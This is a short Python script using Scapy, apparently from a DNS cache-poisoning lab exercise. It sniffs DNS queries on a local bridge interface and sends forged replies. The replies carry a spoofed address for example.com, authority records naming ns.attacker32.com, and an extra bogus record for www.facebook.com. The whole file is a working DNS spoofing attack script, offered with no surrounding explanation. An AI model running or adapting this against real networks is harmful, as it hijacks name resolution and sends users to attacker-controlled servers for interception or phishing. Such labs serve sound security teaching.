#!/usr/bin/env python3
from scapy.all import *

def spoof_dns(packet):
  if (DNS in packet and 'example.com' in packet[DNS].qd.qname.decode('utf-8')):

    # Swapping the src and dest IP address
    IPpacket = IP(dst=packet[IP].src, src=packet[IP].dst)

    # Swapping the port number
    UDPpacket = UDP(dport=packet[UDP].sport, sport=53)

    # The Answer Section { contians RR that answer the question }
    Answer_section = DNSRR(RRname=packet[DNS].qd.qname, type='A',
                 ttl=259200, rdata='1.2.3.4')

    # The Authority Section {contains RRs that point toward an authoritative name server}
    AuthSec1 = DNSRR(RRname='example.com', type='NS',
                   ttl=259200, rdata='ns.attacker32.com')
    AuthSec2 = DNSRR(RRname='example.com', type='NS',
                   ttl=259200, rdata='ns.example.com')

    # The Additional Section { contains RRs that relate to the query }
    AdditonSec1 = DNSRR(RRname='ns.attacker32.com', type='A',
                    ttl=259200, rdata='1.2.3.4')
    AdditonSec2 = DNSRR(RRname='ns.example.net', type='A',
                    ttl=259200, rdata='5.6.7.8')
    AdditonSec3 = DNSRR(RRname='www.facebook.com', type='A',
                    ttl=259200, rdata='3.4.5.6')

    # Construct the DNS packet
    DNSpacket = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=2, arcount=3,
                 an=Answer_section, ns=AuthSec1/AuthSec2, ar=AdditonSec1/AdditonSec2/AdditonSec3)

    # Construct the entire IP packet and send it out
    Spoofpacket = IPpacket/UDPpacket/DNSpacket
    send(Spoofpacket)

# Sniff UDP query packets and invoke spoof_dns().
f = 'udp and src host 10.9.0.53 and dst port 53'
packet = sniff(iface='br-038b28aef07b', filter=f, prn=spoof_dns)    